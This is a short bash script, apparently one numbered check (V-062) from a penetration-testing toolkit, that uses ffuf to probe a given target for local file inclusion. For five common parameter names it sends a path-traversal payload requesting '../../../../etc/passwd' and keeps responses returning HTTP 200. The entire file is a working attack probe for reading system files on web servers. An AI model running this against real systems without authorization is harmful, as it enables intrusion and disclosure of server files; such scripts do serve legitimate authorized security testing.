#!/bin/bash
# V-062 -- LFI
# Tool: ffuf
# Usage: bash V-062.sh <target> <session_output_dir>

TARGET="${1:?Usage: V-062.sh <target> <session_output_dir>}"
SESSION_DIR="${2:-}"

if [[ ! "$TARGET" =~ ^https?:// ]]; then TARGET="http://$TARGET"; fi
for param in file page include path doc; do echo "=== $param ==="; ffuf -u "$TARGET/?$param=../../../../etc/passwd" -mc 200 -fs 0 -timeout 5 2>&1 | tail -5; done
exit $?
